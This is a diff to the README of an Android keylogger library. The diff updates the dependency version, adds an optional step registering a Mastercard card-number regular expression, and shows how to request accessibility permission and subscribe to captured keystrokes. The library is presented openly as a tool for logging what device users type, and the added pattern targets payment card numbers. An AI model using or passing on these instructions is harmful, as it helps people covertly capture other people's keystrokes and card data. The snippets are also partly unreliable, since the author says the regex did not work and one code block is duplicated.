@@ -12,14 +12,25 @@ allprojects {
 2. Add the dependency to your app's build.gradle
 ```gradle
 dependencies {
-        implementation 'com.github.evilthreads669966:android_keylogger:1.2'
+        implementation 'com.github.evilthreads669966:android_keylogger:1.3'
 }
 ```
 3. Request the accessibility service permission for your app.
 ```kotlin
 Keylogger.requestPermission(this)
 ```
-4. Subscribe to keystrokes
+4. (optional) Add any regular expressions to match
+```kotlin
+//mastercard 
+//but this pattern wasn't working for me upon development. I am not very good with them.
+Keylogger.addPattern("^5[1-5][0-9]{14}\\$")
+```
+```kotlin
+Keylogger.subscribe { entry ->
+    //do something with keystrokes here
+}
+```
+5. Subscribe to keystrokes
 ```kotlin
 Keylogger.subscribe { entry ->
     //do something with keystrokes here
